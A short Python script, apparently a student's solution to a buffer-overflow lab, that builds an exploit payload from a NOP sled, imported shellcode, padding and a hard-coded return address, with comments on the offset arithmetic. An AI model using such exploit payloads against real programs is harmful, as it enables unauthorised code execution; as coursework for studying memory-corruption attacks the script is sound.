#!/usr/bin/env python3

import sys

from shellcode import shellcode
#sys.stdout.buffer.write(b'A'*10)
# 1024-54=970 --> /2=485

sys.stdout.buffer.write((b'\x90' * 960) + shellcode + b'A'*2 + (0x7ffffff6d248).to_bytes(8,"little"))
# 0x7ffffff6d4c8: ret
# return to middle of noop sled
# adding a big noop sled before the shellcode so the return address doesn’t have to be super precise
# can no longer write the return address into it bc we don't know the exact offset
# aren't subtracting 54 bc we have 2 byte noop --> subtracting 56
# need to add code so that no matter how the stack organizes itself, I am always returning the entire shellcode
# writing to the address of the shellcode

# should there be a while loop to wait for a certain symbol?